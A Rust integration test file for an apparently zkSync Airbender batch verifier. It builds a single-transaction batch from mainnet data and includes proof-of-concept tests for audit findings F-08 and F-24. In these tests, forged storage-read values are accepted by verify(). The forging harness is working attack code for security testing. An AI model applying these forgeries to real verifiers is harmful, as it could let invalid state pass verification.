//! Integration test: trim a real batch down to a single transaction and run
//! it through the verifier end-to-end.
//!
//! This serves as a perturbation-friendly harness: the resulting input has all
//! invariants (merkle paths, prev-batch binding, blob hashes) regenerated, so
//! mutating the input tx — or the initial storage — produces a self-consistent
//! batch that should reach the verifier.
//!
//! Requires the test batch to be fetched via Git LFS:
//!   ./scripts/fetch_lfs_batches.sh 506093.bin.gz

use std::{
    collections::{BTreeMap, HashMap, HashSet},
    path::Path,
};

use anyhow::{Context, Result};
use zksync_airbender_verifier::{
    test_utils::{augment_with_synthetic_commitment, crosscheck_commitment},
    types::V1AirbenderVerifierInput,
    Verify,
};
use zksync_cli_utils::{load_batch, BatchInputFile};
use zksync_crypto_primitives::hasher::blake2::Blake2Hasher;
use zksync_merkle_tree::{
    HashTree, MerkleTree, PatchSet, StorageLogMetadata, TreeEntry, TreeInstruction, TreeLogEntry,
    WitnessInputMerklePaths,
};
use zksync_multivm::{
    interface::{
        storage::{StorageSnapshot, StorageView},
        utils::compress_value_and_index,
        L2BlockEnv, VmInterface, VmInterfaceExt, VmInterfaceHistoryEnabled,
    },
    pubdata_builders::pubdata_params_to_builder,
    FastVmInstance,
};
use zksync_types::{
    block::L2BlockExecutionData, u256_to_h256, L2BlockNumber, StorageKey, Transaction, H256, U256,
};

/// Depth of the verifier's JMT — Blake2 over 256-bit hashed keys. Matches
/// `zksync_merkle_tree::types::internal::TREE_DEPTH` (which is `pub(crate)`).
const TREE_DEPTH: usize = 256;

#[test]
fn test_single_tx_synthesized_from_506093() {
    const BATCH_NUMBER: u64 = 506093;
    let batch_path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../testdata/era_mainnet_batches/binary/506093.bin.gz");
    if !batch_path.exists() {
        eprintln!(
            "Skipping test: batch file not found at {}. Run: ./scripts/fetch_lfs_batches.sh 506093.bin.gz",
            batch_path.display()
        );
        return;
    }
    let file_size = std::fs::metadata(&batch_path).unwrap().len();
    if file_size < 1000 {
        eprintln!("Skipping test: batch file appears to be a Git LFS pointer ({file_size} bytes)");
        return;
    }

    let base = load_batch(&BatchInputFile {
        number: BATCH_NUMBER,
        path: batch_path,
    })
    .expect("failed to load batch")
    .into_v1()
    .expect("expected V1 payload");

    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block in batch");
    let input = make_single_tx_input(base, pick).expect("failed to synthesize single-tx input");

    let result = input.clone().verify().expect("verification failed");
    crosscheck_commitment(&result, &input).expect("crosscheck failed");

    println!("Batch: {}", result.batch_number);
    println!("State root: {:?}", result.value_hash);
    println!("Commitment: {:?}", result.commitment);
    println!("New enum index: {}", result.new_enumeration_index);
}

/// Demonstrates F-08: the `ReadMissingKey` arm of `map_log_tree` does not
/// bind the VM-observed value against the merkle witness, so the verifier
/// accepts a non-zero `read_storage_key[K]` for a key K that is empty in the
/// old state root.
///
/// Strategy:
/// 1. Run the baseline single-tx harness; record every key the tx reads with
///    a zero value (candidates for "looks empty to the tree").
/// 2. Pick one candidate K. Re-run the harness with `read_storage_key[K]`
///    forged to a non-zero V_evil, **and** skip seeding K into the merkle
///    tree (so its witness is a genuine absence proof).
/// 3. Run `verify()`. If F-08 is unpatched, it returns Ok and the resulting
///    witness contains a `leaf_enumeration_index == 0` entry for K — the
///    smoking gun. If F-08 is patched (per the audit's recommended fix), the
///    verifier bails with "VM read non-zero value from a missing key".
#[test]
fn test_forge_missing_read_triggers_f08() {
    let batch_path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../testdata/era_mainnet_batches/binary/506093.bin.gz");
    if !batch_path.exists() || std::fs::metadata(&batch_path).unwrap().len() < 1000 {
        eprintln!("Skipping: batch file 506093.bin.gz missing or LFS pointer");
        return;
    }
    let base = load_batch(&BatchInputFile {
        number: 506093,
        path: batch_path,
    })
    .expect("failed to load batch")
    .into_v1()
    .expect("expected V1 payload");
    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block");

    // Pass 1: baseline run to discover which keys this tx reads with a
    // zero value (candidate "looks-empty-to-the-tree" slots), and to record
    // the baseline commitment so we can show the forge changes it.
    let baseline = make_single_tx_input(base.clone(), pick).expect("baseline failed");
    let zero_read_hashes: Vec<U256> = baseline
        .merkle_paths
        .merkle_paths
        .iter()
        .filter(|log| !log.is_write && log.value_read == [0u8; 32])
        .map(|log| log.leaf_hashed_key)
        .collect();
    eprintln!("baseline reads of zero values: {}", zero_read_hashes.len());
    let baseline_result = baseline
        .clone()
        .verify()
        .expect("baseline verify() should succeed");
    eprintln!("baseline commitment:   {:?}", baseline_result.commitment);
    eprintln!("baseline state root:   {:?}", baseline_result.value_hash);
    eprintln!(
        "baseline proof input:  {:?}",
        baseline_result.proof_public_input
    );

    // Build a map: hashed_key -> StorageKey, so we can recover the unhashed
    // key for any candidate.
    let read_set = &base.vm_run_data.witness_block_state.read_storage_key;
    let hashed_to_key: HashMap<U256, StorageKey> =
        read_set.keys().map(|k| (k.hashed_key_u256(), *k)).collect();

    // Skip kernel-space addresses (< 2^16). Forging slots in system contracts
    // (AccountCodeStorage, NonceHolder, BootloaderUtilities, ...) typically
    // tears down VM dispatch before the bootloader reaches the pubdata hook,
    // hiding the F-08 acceptance behind a panic. User-space contract slots
    // are far safer — most contracts just propagate storage values out.
    let kernel_space_max = U256::from(1u64 << 16);
    let v_evil = H256::from_low_u64_be(0xdead_beef_dead_beef);

    for hashed in &zero_read_hashes {
        let Some(target_key) = hashed_to_key.get(hashed).copied() else {
            continue;
        };
        let addr_u256 = U256::from_big_endian(target_key.address().as_bytes());
        if addr_u256 < kernel_space_max {
            continue;
        }
        eprintln!("trying forge {target_key:?} = {v_evil:?}");
        let perturb = Perturbations {
            forge_missing_reads: vec![(target_key, v_evil)],
            ..Default::default()
        };
        let forged = match make_single_tx_input_with(base.clone(), pick, perturb) {
            Ok(f) => f,
            Err(e) => {
                eprintln!("  build failed: {e}");
                continue;
            }
        };
        // Smoking gun #1: witness has a leaf_enumeration_index=0 entry for K.
        let Some(absent_entry) = forged
            .merkle_paths
            .merkle_paths
            .iter()
            .find(|log| log.leaf_hashed_key == *hashed && log.leaf_enumeration_index == 0)
        else {
            eprintln!("  VM didn't observe this read; trying next candidate");
            continue;
        };
        assert!(
            !absent_entry.is_write,
            "forged read must be marked as a read"
        );
        // Smoking gun #2: verify() accepts the forged input.
        match forged.clone().verify() {
            Ok(result) => {
                eprintln!("F-08 unpatched: verify() accepted forged read");
                eprintln!("  forged key:          {target_key:?}");
                eprintln!("  forged value:        {v_evil:?}");
                eprintln!("  baseline commitment: {:?}", baseline_result.commitment);
                eprintln!("  forged   commitment: {:?}", result.commitment);
                eprintln!("  baseline state root: {:?}", baseline_result.value_hash);
                eprintln!("  forged   state root: {:?}", result.value_hash);
                eprintln!(
                    "  baseline proof in:   {:?}",
                    baseline_result.proof_public_input
                );
                eprintln!("  forged   proof in:   {:?}", result.proof_public_input);
                assert_ne!(
                    result.commitment, baseline_result.commitment,
                    "commitment must change to demonstrate the forge had observable effect",
                );
                return;
            }
            Err(e) => {
                eprintln!("  verify failed: {e:#}");
            }
        }
    }
    panic!("no user-space zero-read candidate produced an accepting forged input");
}

/// Demonstrates F-24's **Inserted** variant: when the tx writes a slot K and
/// the witness records K as `leaf_enumeration_index = 0` (empty in old
/// tree), `map_log_tree`'s `(true, Inserted)` arm emits
/// `TreeInstruction::write(K, idx, V_new)` consuming only the *written*
/// value. `StorageLog::from_log_query` discards `read_value`, so a forged
/// `read_storage_key[K] = V_evil` is silently accepted even though the VM
/// observed V_evil before writing.
///
/// In our trim-down harness, the baseline seeds the tree from
/// `read_storage_key` (zero-valued reads included), so every actual VM write
/// shows up as Updated. We **construct** the Inserted scenario by taking a
/// baseline write target and applying `forge_missing_reads` — which skips K
/// from tree seeding and overrides the value in `read_storage_key`. The
/// forged run produces an Inserted witness entry; F-24's Inserted-arm path
/// is what accepts it.
#[test]
fn test_forge_inserted_write_triggers_f24() {
    let (base, baseline, baseline_result) = load_and_baseline();
    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block");
    let candidates = write_candidates(&baseline, &base);
    eprintln!("baseline write candidates: {}", candidates.len());
    let v_evil = H256::from_low_u64_be(0xdead_beef_dead_beef);
    for target_key in &candidates {
        eprintln!("trying Inserted-forge {target_key:?} = {v_evil:?}");
        let perturb = Perturbations {
            forge_missing_reads: vec![(*target_key, v_evil)],
            ..Default::default()
        };
        let Some((forged, result)) = run_perturb(&base, pick, perturb) else {
            continue;
        };
        // Witness must show Inserted (first_write=true) for our target.
        let target_hashed = target_key.hashed_key_u256();
        let Some(entry) = forged
            .merkle_paths
            .merkle_paths
            .iter()
            .find(|log| log.leaf_hashed_key == target_hashed && log.is_write)
        else {
            eprintln!("  K not written; next");
            continue;
        };
        if !entry.first_write {
            eprintln!("  expected Inserted (first_write=true), got Updated; next");
            continue;
        }
        report_forge(
            "F-24 Inserted",
            target_key,
            &v_evil,
            &baseline_result,
            &result,
        );
        return;
    }
    panic!("no candidate produced an accepting F-24-Inserted forged input");
}

/// Demonstrates F-24's **Updated** variant: when the tx writes a slot K that
/// is already populated with `(L, V_real)` in the tree, the witness records
/// `is_write=true, first_write=false, leaf_enumeration_index=L,
/// value_read=V_real`. `map_log_tree`'s `(true, Updated)` arm consumes only
/// `storage_log.value` (= V_new), so a forged `read_storage_key[K] = V_evil`
/// makes the VM observe V_evil while the witness keeps the honest V_real —
/// the verifier never cross-checks the two.
#[test]
fn test_forge_updated_write_triggers_f24() {
    let (base, baseline, baseline_result) = load_and_baseline();
    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block");
    let candidates = write_candidates(&baseline, &base);
    eprintln!("baseline write candidates: {}", candidates.len());
    let read_set = &base.vm_run_data.witness_block_state.read_storage_key;
    let v_evil = H256::from_low_u64_be(0xdead_beef_dead_beef);
    for target_key in &candidates {
        // Only Updated-with-non-zero-V_real candidates demonstrate the
        // V_evil/V_real mismatch meaningfully.
        let Some(v_real) = read_set.get(target_key).copied() else {
            continue;
        };
        if v_real == H256::zero() || v_real == v_evil {
            continue;
        }
        eprintln!("trying Updated-forge {target_key:?} V_real={v_real:?} -> V_evil={v_evil:?}");
        let perturb = Perturbations {
            forge_existing_reads: vec![(*target_key, v_evil)],
            ..Default::default()
        };
        let Some((forged, result)) = run_perturb(&base, pick, perturb) else {
            continue;
        };
        let target_hashed = target_key.hashed_key_u256();
        let Some(entry) = forged
            .merkle_paths
            .merkle_paths
            .iter()
            .find(|log| log.leaf_hashed_key == target_hashed && log.is_write)
        else {
            eprintln!("  K not written; next");
            continue;
        };
        if entry.first_write {
            eprintln!("  expected Updated (first_write=false), got Inserted; next");
            continue;
        }
        // Smoking gun: witness's value_read is V_real, even though the VM
        // observed V_evil. Verifier never compares the two.
        assert_eq!(
            H256(entry.value_read),
            v_real,
            "witness value_read must remain the honest V_real",
        );
        eprintln!("  witness value_read:  {v_real:?}  (honest, from tree)");
        eprintln!("  VM-observed value:   {v_evil:?}  (forged, never compared)");
        report_forge(
            "F-24 Updated",
            target_key,
            &v_evil,
            &baseline_result,
            &result,
        );
        return;
    }
    panic!("no candidate produced an accepting F-24-Updated forged input");
}

/// Loads batch 506093, builds the baseline single-tx input, and verifies it.
/// Returns `(base, baseline_input, baseline_verification_result)`.
fn load_and_baseline() -> (
    V1AirbenderVerifierInput,
    V1AirbenderVerifierInput,
    zksync_airbender_verifier::VerificationResult,
) {
    let batch_path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../testdata/era_mainnet_batches/binary/506093.bin.gz");
    assert!(
        batch_path.exists() && std::fs::metadata(&batch_path).unwrap().len() >= 1000,
        "batch file 506093.bin.gz missing or LFS pointer — fetch via scripts/fetch_lfs_batches.sh",
    );
    let base = load_batch(&BatchInputFile {
        number: 506093,
        path: batch_path,
    })
    .expect("failed to load batch")
    .into_v1()
    .expect("expected V1 payload");
    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block");
    let baseline = make_single_tx_input(base.clone(), pick).expect("baseline failed");
    let baseline_result = baseline.clone().verify().expect("baseline verify");
    eprintln!("baseline commitment:   {:?}", baseline_result.commitment);
    eprintln!("baseline state root:   {:?}", baseline_result.value_hash);
    (base, baseline, baseline_result)
}

/// Returns the unhashed StorageKey for every write the baseline tx performs,
/// in deterministic-enough order. Pulls keys from both `read_storage_key`
/// (Updated writes) and `is_write_initial` (Inserted-by-original-batch).
fn write_candidates(
    baseline: &V1AirbenderVerifierInput,
    base: &V1AirbenderVerifierInput,
) -> Vec<StorageKey> {
    let write_hashes: HashSet<U256> = baseline
        .merkle_paths
        .merkle_paths
        .iter()
        .filter(|log| log.is_write)
        .map(|log| log.leaf_hashed_key)
        .collect();
    let mut hashed_to_key: HashMap<U256, StorageKey> = base
        .vm_run_data
        .witness_block_state
        .read_storage_key
        .keys()
        .map(|k| (k.hashed_key_u256(), *k))
        .collect();
    for (k, &iw) in &baseline.vm_run_data.witness_block_state.is_write_initial {
        if iw {
            hashed_to_key.entry(k.hashed_key_u256()).or_insert(*k);
        }
    }
    write_hashes
        .iter()
        .filter_map(|h| hashed_to_key.get(h).copied())
        .collect()
}

/// Runs `make_single_tx_input_with` + `verify`, catching any VM panic so the
/// caller can iterate to the next candidate.
fn run_perturb(
    base: &V1AirbenderVerifierInput,
    pick: TxPick,
    perturb: Perturbations,
) -> Option<(
    V1AirbenderVerifierInput,
    zksync_airbender_verifier::VerificationResult,
)> {
    let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        let forged = make_single_tx_input_with(base.clone(), pick, perturb)?;
        let result = forged.clone().verify()?;
        Ok::<_, anyhow::Error>((forged, result))
    }));
    match outcome {
        Ok(Ok((f, r))) => Some((f, r)),
        Ok(Err(e)) => {
            eprintln!("  err: {e:#}");
            None
        }
        Err(_) => {
            eprintln!("  VM/verifier panicked (likely a system-contract slot)");
            None
        }
    }
}

fn report_forge(
    tag: &str,
    target_key: &StorageKey,
    v_evil: &H256,
    baseline_result: &zksync_airbender_verifier::VerificationResult,
    forged_result: &zksync_airbender_verifier::VerificationResult,
) {
    eprintln!("{tag} unpatched: verify() accepted forged write");
    eprintln!("  forged key:          {target_key:?}");
    eprintln!("  forged value:        {v_evil:?}");
    eprintln!("  baseline commitment: {:?}", baseline_result.commitment);
    eprintln!("  forged   commitment: {:?}", forged_result.commitment);
    eprintln!("  baseline state root: {:?}", baseline_result.value_hash);
    eprintln!("  forged   state root: {:?}", forged_result.value_hash);
    assert_ne!(
        forged_result.commitment, baseline_result.commitment,
        "commitment must change to demonstrate the forge had observable effect",
    );
}

/// Which transaction in the source batch to keep.
#[derive(Debug, Clone, Copy)]
pub struct TxPick {
    /// Index into `l2_blocks_execution_data`.
    pub block_idx: usize,
    /// Index into the chosen block's `txs`.
    pub tx_idx: usize,
}

impl TxPick {
    /// First tx of the first non-empty L2 block. Matches the original default.
    pub fn first_non_empty(input: &V1AirbenderVerifierInput) -> Option<Self> {
        input
            .l2_blocks_execution_data
            .iter()
            .position(|blk| !blk.txs.is_empty())
            .map(|block_idx| Self {
                block_idx,
                tx_idx: 0,
            })
    }
}

/// Knobs for mutating the synthesized input to exercise specific attack
/// surfaces against the verifier.
#[derive(Debug, Default, Clone)]
pub struct Perturbations {
    /// Inject `(K, V_evil)` into `read_storage_key`. The keys are **not**
    /// seeded into the merkle tree, so the witness records each as
    /// `leaf_enumeration_index = 0`. If the VM actually reads K it observes
    /// `V_evil` — exercises F-08's `ReadMissingKey` arm of `map_log_tree`,
    /// and (when K is also written by the tx) F-24's Inserted-arm variant.
    pub forge_missing_reads: Vec<(StorageKey, H256)>,
    /// Override the value of an existing key K in `read_storage_key`. The
    /// merkle tree still seeds K with its **original** value (so the
    /// witness's `value_read = V_real`), but the verifier's storage view
    /// returns `V_evil` to the VM. Exercises F-24's Updated-arm variant when
    /// the tx writes K — `map_log_tree`'s `(true, Updated)` arm emits a
    /// `TreeInstruction::write(K, L, V_new)` consuming only the *written*
    /// value, and `StorageLog::from_log_query` discards the read value, so
    /// the verifier never observes the V_evil/V_real mismatch.
    pub forge_existing_reads: Vec<(StorageKey, H256)>,
}

/// Take a multi-tx verifier input and produce a self-consistent input that
/// runs exactly one chosen transaction (selected by [`TxPick`]).
///
/// Merkle paths and `previous_batch_hash` are regenerated against an in-memory
/// [`MerkleTree<PatchSet>`] seeded from `vm_run_data.witness_block_state` — so
/// the resulting `previous_batch_hash` differs from the original batch's. The
/// commitment input is filled by [`augment_with_synthetic_commitment`].
///
/// # State-dependency limitation
///
/// Only `pick = TxPick::first_non_empty(&base)` is actually supported. Later
/// txs depend on state written by earlier ones in the same batch, but
/// `witness_block_state.read_storage_key` only captures reads against the
/// *underlying* tree — in-batch StorageView writes never land there. So if
/// you isolate tx N>0, its reads see pre-batch state instead of the state
/// after txs 0..N-1, and the bootloader halts before producing pubdata.
///
/// This helper rejects unsupported picks rather than letting the VM panic.
fn make_single_tx_input(
    base: V1AirbenderVerifierInput,
    pick: TxPick,
) -> Result<V1AirbenderVerifierInput> {
    make_single_tx_input_with(base, pick, Perturbations::default())
}

fn make_single_tx_input_with(
    mut base: V1AirbenderVerifierInput,
    pick: TxPick,
    perturb: Perturbations,
) -> Result<V1AirbenderVerifierInput> {
    let first_non_empty =
        TxPick::first_non_empty(&base).context("no non-empty L2 block found in the batch")?;
    anyhow::ensure!(
        pick.block_idx == first_non_empty.block_idx && pick.tx_idx == 0,
        "make_single_tx_input only supports pick == first_non_empty (block_idx={}, tx_idx=0); \
         got block_idx={}, tx_idx={}. Later txs need state written by earlier ones, but \
         `witness_block_state.read_storage_key` only contains pre-batch values — running a \
         later tx in isolation would see stale state and halt the bootloader. \
         To target a different tx, replay all preceding txs as setup (not currently supported).",
        first_non_empty.block_idx,
        pick.block_idx,
        pick.tx_idx,
    );
    let block = base.l2_blocks_execution_data[pick.block_idx].clone();
    let single_tx = block.txs[pick.tx_idx].clone();
    // `execute_vm` iterates `(block_i, block_{i+1})` pairs; only the first
    // block's txs run. We need a `next` block to provide the L2-block-start
    // arguments, but its txs are never executed.
    let next_block = base
        .l2_blocks_execution_data
        .get(pick.block_idx + 1)
        .cloned()
        .unwrap_or_else(|| L2BlockExecutionData {
            number: L2BlockNumber(block.number.0 + 1),
            timestamp: block.timestamp + 1,
            prev_block_hash: H256::zero(),
            virtual_blocks: 1,
            txs: vec![],
            interop_roots: vec![],
        });
    let trimmed_first = L2BlockExecutionData {
        txs: vec![single_tx],
        ..block
    };
    // `l1_batch_env.first_l2_block` is what the bootloader uses as the
    // *initial* L2 block. If we picked a tx from anything other than the
    // original first block, that env now disagrees with our new first block;
    // re-sync it so the bootloader's L2 block number/timestamp match.
    base.l1_batch_env.first_l2_block = L2BlockEnv::from_l2_block_data(&trimmed_first);
    base.l2_blocks_execution_data = vec![trimmed_first, next_block];

    // Snapshot original read set BEFORE applying any forges — the merkle
    // tree must be seeded with the *honest* values so the witness's
    // `value_read` field reflects what's actually in the tree.
    let original_reads = base
        .vm_run_data
        .witness_block_state
        .read_storage_key
        .clone();
    let forge_missing_set: HashSet<StorageKey> = perturb
        .forge_missing_reads
        .iter()
        .map(|(k, _)| *k)
        .collect();
    for (k, _) in &perturb.forge_existing_reads {
        anyhow::ensure!(
            original_reads.contains_key(k),
            "forge_existing_reads requires K={k:?} to already be in read_storage_key; \
             use forge_missing_reads for keys that aren't",
        );
    }
    // Apply forges to the verifier-visible read_storage_key: missing-read
    // forges add new K=V_evil entries; existing-read forges overwrite V_real.
    let mut read_storage = original_reads.clone();
    for (k, v) in &perturb.forge_missing_reads {
        read_storage.insert(*k, *v);
    }
    for (k, v) in &perturb.forge_existing_reads {
        read_storage.insert(*k, *v);
    }
    base.vm_run_data.witness_block_state.read_storage_key = read_storage.clone();
    let initial_writes_orig = base
        .vm_run_data
        .witness_block_state
        .is_write_initial
        .clone();

    // Seed the tree from `original_reads`, skipping the missing-read forges.
    // existing-read forges stay in the tree with their original V_real so
    // their witness `value_read` matches the merkle-proved value.
    let mut entries: Vec<TreeEntry> =
        Vec::with_capacity(original_reads.len().saturating_sub(forge_missing_set.len()));
    let mut hashed_to_index: HashMap<H256, u64> = HashMap::with_capacity(entries.capacity());
    let mut next_leaf_index: u64 = 0;
    for (key, value) in original_reads.iter() {
        if forge_missing_set.contains(key) {
            continue;
        }
        next_leaf_index += 1;
        let hashed = key.hashed_key();
        hashed_to_index.insert(hashed, next_leaf_index);
        entries.push(TreeEntry::new(
            key.hashed_key_u256(),
            next_leaf_index,
            *value,
        ));
    }

    let mut tree =
        MerkleTree::new(PatchSet::default()).context("creating empty in-memory merkle tree")?;
    let initial_output = tree
        .extend(entries)
        .context("seeding tree with initial state")?;
    let r_initial = initial_output.root_hash;
    let initial_leaf_count = initial_output.leaf_count;

    base.l1_batch_env.previous_batch_hash = Some(r_initial);

    // Build the VM's storage view the same way `airbender_verifier::execute`
    // does: read set keyed by hashed key, with synthetic enum indices, plus
    // every original initial-write key mapped to `None` (absent in tree).
    let mut storage_map: BTreeMap<H256, Option<(H256, u64)>> = read_storage
        .iter()
        .map(|(k, v)| {
            let hashed = k.hashed_key();
            (
                hashed,
                compress_value_and_index(*v, hashed_to_index.get(&hashed).copied()),
            )
        })
        .collect();
    for (key, initial_write) in &initial_writes_orig {
        if *initial_write {
            storage_map.entry(key.hashed_key()).or_insert(None);
        }
    }
    let factory_deps: BTreeMap<H256, Vec<u8>> = base
        .vm_run_data
        .used_bytecodes
        .iter()
        .map(|(claimed_hash, words)| (u256_to_h256(*claimed_hash), words.clone().into_flattened()))
        .collect();

    let storage_snapshot = StorageSnapshot::new(storage_map, factory_deps);
    let storage_view = StorageView::new(storage_snapshot).to_rc_ptr();
    let mut vm: FastVmInstance<StorageSnapshot> = FastVmInstance::fast(
        base.l1_batch_env.clone(),
        base.system_env.clone(),
        storage_view,
    );

    let first_block = base.l2_blocks_execution_data[0].clone();
    let next_block = base.l2_blocks_execution_data[1].clone();
    for tx in &first_block.txs {
        execute_tx(tx, &mut vm)?;
    }
    vm.start_new_l2_block(L2BlockEnv::from_l2_block_data(&next_block));
    let vm_out = vm.finish_batch(pubdata_params_to_builder(
        base.pubdata_params,
        base.system_env.version,
    ));

    // Build TreeInstructions in the SAME order as the VM emits deduplicated
    // storage logs — the verifier zips its rerun's vm_logs with the bowp
    // built from merkle paths, so ordering must match.
    let vm_logs = vm_out
        .final_execution_state
        .deduplicated_storage_logs
        .clone();
    let mut instructions: Vec<TreeInstruction> = Vec::with_capacity(vm_logs.len());
    let mut next_leaf_index = initial_leaf_count + 1;
    let mut is_write_initial: HashMap<StorageKey, bool> = HashMap::new();
    for log in &vm_logs {
        let hashed = log.key.hashed_key();
        let hashed_u256 = log.key.hashed_key_u256();
        if log.is_write() {
            let (leaf_index, initial) = if let Some(&idx) = hashed_to_index.get(&hashed) {
                (idx, false)
            } else {
                let idx = next_leaf_index;
                next_leaf_index += 1;
                hashed_to_index.insert(hashed, idx);
                (idx, true)
            };
            is_write_initial.insert(log.key, initial);
            instructions.push(TreeInstruction::write(hashed_u256, leaf_index, log.value));
        } else {
            instructions.push(TreeInstruction::Read(hashed_u256));
        }
    }

    let bowp = tree
        .extend_with_proofs(instructions.clone())
        .context("generating merkle proofs for single-tx run")?;

    // Mirrors `zksync_merkle_tree::domain::ZkSyncTree::process_l1_batch_full`:
    // expand each compact path to TREE_DEPTH, then re-compact via
    // `WitnessInputMerklePaths::push_merkle_path` (which strips shared prefixes
    // relative to the first path).
    let mut witness = WitnessInputMerklePaths::new(initial_leaf_count + 1);
    witness.reserve(bowp.logs.len());
    for (log, instruction) in bowp.logs.iter().zip(&instructions) {
        let empty_levels_end = TREE_DEPTH - log.merkle_path.len();
        let empty_subtree_hashes =
            (0..empty_levels_end).map(|i| Blake2Hasher.empty_subtree_hash(i));
        let merkle_paths: Vec<[u8; 32]> = empty_subtree_hashes
            .chain(log.merkle_path.iter().copied())
            .map(|hash| hash.0)
            .collect();
        let value_written = match instruction {
            TreeInstruction::Write(entry) => entry.value.0,
            TreeInstruction::Read(_) => [0_u8; 32],
        };
        let value_read = match log.base {
            TreeLogEntry::Updated { previous_value, .. } => {
                // Matches the upstream no-op-update omission rule.
                if previous_value.0 == value_written {
                    continue;
                }
                previous_value.0
            }
            TreeLogEntry::Read { value, .. } => value.0,
            TreeLogEntry::Inserted | TreeLogEntry::ReadMissingKey => [0_u8; 32],
        };
        let leaf_enumeration_index = match instruction {
            TreeInstruction::Write(entry) => entry.leaf_index,
            TreeInstruction::Read(_) => match log.base {
                TreeLogEntry::Read { leaf_index, .. } => leaf_index,
                TreeLogEntry::ReadMissingKey => 0,
                _ => unreachable!("reads only resolve to Read / ReadMissingKey log entries"),
            },
        };
        witness.push_merkle_path(StorageLogMetadata {
            root_hash: log.root_hash.0,
            is_write: !matches!(
                log.base,
                TreeLogEntry::Read { .. } | TreeLogEntry::ReadMissingKey
            ),
            first_write: matches!(log.base, TreeLogEntry::Inserted),
            merkle_paths,
            leaf_hashed_key: instruction.key(),
            leaf_enumeration_index,
            value_written,
            value_read,
        });
    }
    base.merkle_paths = witness;
    base.vm_run_data.witness_block_state.is_write_initial = is_write_initial;

    augment_with_synthetic_commitment(base)
}

fn execute_tx<VM>(tx: &Transaction, vm: &mut VM) -> Result<()>
where
    VM: VmInterfaceHistoryEnabled + VmInterfaceExt,
{
    vm.make_snapshot();
    if vm
        .execute_transaction_with_bytecode_compression(tx.clone(), true)
        .0
        .is_ok()
    {
        vm.pop_snapshot_no_rollback();
        return Ok(());
    }
    vm.rollback_to_the_latest_snapshot();
    if vm
        .execute_transaction_with_bytecode_compression(tx.clone(), false)
        .0
        .is_err()
    {
        anyhow::bail!("compression must succeed when disabled");
    }
    Ok(())
}
